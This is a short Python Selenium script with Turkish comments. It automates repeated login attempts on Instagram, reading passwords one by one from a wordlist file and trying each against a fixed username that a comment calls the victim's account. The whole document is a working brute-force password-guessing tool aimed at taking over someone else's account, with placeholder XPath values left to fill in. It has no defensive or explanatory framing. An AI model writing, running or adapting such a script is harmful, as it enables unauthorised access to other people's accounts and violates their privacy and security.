from selenium import webdriver
import time

browser = webdriver.Firefox()
browser.get('https://www.instagram.com/')
time.sleep(2)
k_adi = browser.find_element_by_xpath('xpath kodu') #Kullanıcı alanının xpath kodu
k_sifre = browser.find_element_by_xpath('xpath kodu') #Şifre alanının xpath kodu
giris = browser.find_element_by_xpath('xpath kodu') #Giriş Butonunun xpath kodu

dosya = open('sifre.txt','r')
time.sleep(3)

for sifre in dosya:
    k_adi.send_keys('isim') #Kurbanın instagram ismi
    k_sifre.send_keys(sifre)
    print(sifre)
    giris.click()
    time.sleep(2)

    browser.find_element_by_xpath('xpath kodu').clear() #Kullanıcı alanının xpath kodu
    browser.find_element_by_xpath('xpath kodu').clear() #Şifre alanının xpath kodu

dosya.close()
